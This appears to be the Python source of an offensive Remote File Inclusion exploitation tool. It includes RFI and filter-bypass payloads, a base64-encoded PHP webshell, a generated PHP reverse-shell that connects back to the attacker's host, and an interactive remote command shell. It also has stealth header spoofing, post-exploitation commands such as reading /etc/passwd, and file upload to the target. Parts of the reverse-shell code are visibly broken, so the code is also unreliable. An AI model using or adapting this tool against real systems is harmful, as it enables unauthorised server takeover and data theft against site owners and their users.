#!/usr/bin/env python3
"""
RFIExploiter - Advanced Remote File Inclusion Exploitation Module
"""

import requests
import urllib.parse
import base64
import random
import time
import os
import socket
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import track
import logging
from fake_useragent import UserAgent

console = Console()

class RFIExploiter:
    def __init__(self, url, param, proxies=None, stealth=False, delay=0, output="rfi_report"):
        self.url = url
        self.param = param
        self.proxies = proxies
        self.stealth = stealth
        self.delay = delay
        self.output = output
        self.session = requests.Session()
        self.session.proxies = proxies if proxies else {}
        self.ua = UserAgent()
        self.vulnerable = False
        self.shell_url = None
        self.base_payloads = [
    # Classic RFI payloads
    "http://{SERVER}/shell.txt",
    "https://{SERVER}/malware.php",
    "//{SERVER}/backdoor.txt",
    "\\\\{SERVER}\\malware.php",

    # Obfuscated payloads
    "http://example.com@{SERVER}/shell.php",
    "http://{SERVER}:80#@example.com/test.php",
    "http://{SERVER}?example.com",
    "http://{SERVER}\\example.com",

    # Protocol wrappers
    "expect://whoami",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "php://input",

    # Advanced bypass techniques
    "http://{SERVER}/shell.jpg?.php",
    "http://{SERVER}/.php",
    "http://{SERVER}/test.png%00.php",
    "http://{SERVER}/test.txt%20",

    # DNS tricks
    "http://{SERVER}.example.com/test.php",
    "http://{SERVER}:8080/shell.php",

    # IPv6 format
    "http://[::ffff:{SERVER}]/shell.php",

    # Alternative encodings
    "http://{SERVER}/%2e%2e/test.php",
    "http://{SERVER}/%252e%252e/test.php"
]
        
    def get_random_user_agent(self):
        return self.ua.random
    
    def check_vulnerability(self):
        """Check if target is vulnerable to RFI"""
        test_payloads = [
            "http://example.com",
            "https://google.com",
            "//example.com"
        ]
        
        console.print(Panel.fit("[bold yellow]Testing for RFI vulnerability...[/bold yellow]"))
        
        for payload in test_payloads:
            try:
                test_url = f"{self.url}?{self.param}={payload}"
                headers = {"User-Agent": self.get_random_user_agent()}
                
                if self.stealth:
                    time.sleep(self.delay + random.uniform(0, 1.5))
                    headers.update({
                        "Referer": "https://google.com",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                    })
                
                response = self.session.get(test_url, headers=headers, timeout=10)
                
                if "example.com" in response.text or "google" in response.text:
                    console.print(f"[green]✓ Potential RFI vulnerability found with payload: {payload}[/green]")
                    logging.info(f"Potential RFI vulnerability found with payload: {payload}")
                    self.vulnerable = True
                    return True
                
            except Exception as e:
                logging.error(f"Error testing payload {payload}: {str(e)}")
                continue
        
        console.print("[red]✗ No obvious RFI vulnerability detected[/red]")
        return False
    
    def generate_shell(self, server_ip, server_port=8000):
        """Generate PHP shell code"""
        basic_shell = """<?php
if(isset($_REQUEST['cmd'])) {
    system($_REQUEST['cmd']);
}
?>"""
        
        advanced_shell = """<?php
error_reporting(0);
$ip = '{SERVER_IP}';
$port = {SERVER_PORT};
if (($f = 'stream_socket_client') && is_callable($f)) {
    $s = $f("tcp://{$ip}:{$port}");
    $s_type = 'stream';
} elseif (($f = 'fsockopen') && is_callable($f)) {
    $s = $f($ip, $port);
    $s_type = 'stream';
} elseif (($f = 'socket_create') && is_callable($f)) {
    $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
    $res = @socket_connect($s, $ip, $port);
    if (!$res) { die(); }
    $s_type = 'socket';
} else {
    die('no socket funcs');
}
$s_type($s);
?>"""
        
        return advanced_shell.replace("{SERVER_IP}", server_ip).replace("{SERVER_PORT}", str(server_port))
    
    def start_local_server(self, port=8000):
        """Start a simple HTTP server to host the shell"""
        try:
            from http.server import SimpleHTTPRequestHandler
            from socketserver import TCPServer
            
            console.print(f"[yellow]Starting temporary HTTP server on port {port}...[/yellow]")
            handler = SimpleHTTPRequestHandler
            httpd = TCPServer(("", port), handler)
            
            # Save shell to file
            with open("shell.php", "w") as f:
                f.write(self.generate_shell(socket.gethostbyname(socket.gethostname()), port))
            
            console.print("[green]✓ Server started. Shell available at http://{YOUR_IP}/shell.php[/green]")
            return httpd
        except Exception as e:
            console.print(f"[red]✗ Error starting server: {str(e)}[/red]")
            return None
    
    def exploit(self, server_url=None):
        """Exploit the RFI vulnerability"""
        if not self.check_vulnerability():
            return False
        
        if not server_url:
            console.print("[yellow]No external server provided. Using local server...[/yellow]")
            httpd = self.start_local_server()
            if not httpd:
                return False
            
            server_url = f"http://{socket.gethostbyname(socket.gethostname())}:8000/shell.php"
            self.shell_url = server_url
            
            try:
                # Start the server in a separate thread
                import threading
                server_thread = threading.Thread(target=httpd.serve_forever)
                server_thread.daemon = True
                server_thread.start()
                
                console.print("[yellow]Attempting RFI exploitation...[/yellow]")
                exploit_url = f"{self.url}?{self.param}={server_url}"
                
                # Test the shell
                test_cmd = "whoami"
                shell_url = f"{exploit_url}&cmd={test_cmd}"
                response = self.session.get(shell_url, timeout=10)
                
                if response.status_code == 200 and len(response.text.strip()) > 0:
                    console.print(Panel.fit(f"[bold green]✓ Success! Command executed: {test_cmd}[/bold green]\n"
                                          f"[cyan]Output:[/cyan]\n{response.text}"))
                    self.interactive_shell(exploit_url)
                else:
                    console.print("[red]✗ Exploit attempt failed. Target may have protections.[/red]")
                
            except Exception as e:
                console.print(f"[red]✗ Error during exploitation: {str(e)}[/red]")
            finally:
                httpd.shutdown()
                os.remove("shell.php")
        else:
            # Use provided server URL
            self.shell_url = server_url
            console.print(f"[yellow]Using external server: {server_url}[/yellow]")
            exploit_url = f"{self.url}?{self.param}={server_url}"
            self.interactive_shell(exploit_url)
        
        return True
    
    def interactive_shell(self, exploit_url):
        """Start an interactive shell session"""
        console.print(Panel.fit("[bold green]Starting interactive shell session[/bold green]\n"
                              "[yellow]Type 'exit' to quit[/yellow]"))
        
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() in ['exit', 'quit']:
                    break
                
                if not cmd.strip():
                    continue
                
                # Encode command for URL
                encoded_cmd = urllib.parse.quote(cmd)
                shell_url = f"{exploit_url}&cmd={encoded_cmd}"
                
                response = self.session.get(shell_url, timeout=10)
                
                if response.status_code == 200:
                    console.print(f"[cyan]Output:[/cyan]\n{response.text}")
                else:
                    console.print(f"[red]Error executing command (Status: {response.status_code})[/red]")
                
            except KeyboardInterrupt:
                console.print("[yellow]Exiting shell...[/yellow]")
                break
            except Exception as e:
                console.print(f"[red]Error: {str(e)}[/red]")
    
    def post_exploitation(self, exploit_url):
        """Perform post-exploitation tasks"""
        console.print(Panel.fit("[bold red]Post-Exploitation Phase[/bold red]"))
        
        commands = {
            "System Info": "uname -a",
            "Current User": "whoami",
            "Processes": "ps aux",
            "Network Info": "ifconfig || ip a",
            "Users": "cat /etc/passwd",
            "Sudo Version": "sudo -V",
            "Cron Jobs": "crontab -l",
            "Web Root Files": "ls -la /var/www/html"
        }
        
        results = {}
        
        for desc, cmd in commands.items():
            try:
                encoded_cmd = urllib.parse.quote(cmd)
                shell_url = f"{exploit_url}&cmd={encoded_cmd}"
                response = self.session.get(shell_url, timeout=15)
                
                if response.status_code == 200:
                    results[desc] = response.text
                    console.print(f"[green]✓ {desc} collected[/green]")
                else:
                    results[desc] = f"Error: Status {response.status_code}"
                    console.print(f"[yellow]⚠ {desc} failed (Status: {response.status_code})[/yellow]")
                
                time.sleep(self.delay + random.uniform(0, 1))
                
            except Exception as e:
                results[desc] = f"Error: {str(e)}"
                console.print(f"[red]✗ Error collecting {desc}: {str(e)}[/red]")
        
        # Save results
        self.save_results(results, "post_exploitation")
    
    def upload_file(self, exploit_url, local_path, remote_path):
        """Upload a file to the target server"""
        console.print(f"[yellow]Attempting to upload {local_path} to {remote_path}[/yellow]")
        
        try:
            # Read local file
            with open(local_path, "rb") as f:
                content = f.read()
            
            # Base64 encode the content
            encoded_content = base64.b64encode(content).decode('utf-8')
            
            # Create upload command
            upload_cmd = f"echo '{encoded_content}' | base64 -d > {remote_path}"
            encoded_cmd = urllib.parse.quote(upload_cmd)
            
            shell_url = f"{exploit_url}&cmd={encoded_cmd}"
            response = self.session.get(shell_url, timeout=20)
            
            if response.status_code == 200:
                # Verify upload
                verify_cmd = f"ls -la {remote_path}"
                encoded_verify = urllib.parse.quote(verify_cmd)
                verify_url = f"{exploit_url}&cmd={encoded_verify}"
                verify_response = self.session.get(verify_url, timeout=10)
                
                if remote_path in verify_response.text:
                    console.print(f"[green]✓ File successfully uploaded to {remote_path}[/green]")
                    return True
                else:
                    console.print("[red]✗ File upload verification failed[/red]")
                    return False
            else:
                console.print(f"[red]✗ Upload failed (Status: {response.status_code})[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]✗ Error during file upload: {str(e)}[/red]")
            return False
    
    def save_results(self, data, scan_type):
        """Save scan results to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"{self.output}_{scan_type}_{timestamp}.txt"
        
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(f"RFI Exploitation Results - {timestamp}\n")
                f.write(f"Target URL: {self.url}\n")
                f.write(f"Parameter: {self.param}\n")
                f.write(f"Shell URL: {self.shell_url}\n\n")
                
                if isinstance(data, dict):
                    for key, value in data.items():
                        f.write(f"=== {key} ===\n")
                        f.write(f"{value}\n\n")
                else:
                    f.write(data)
            
            console.print(f"[green]✓ Results saved to {filename}[/green]")
            return True
        except Exception as e:
            console.print(f"[red]✗ Error saving results: {str(e)}[/red]")
            return False
            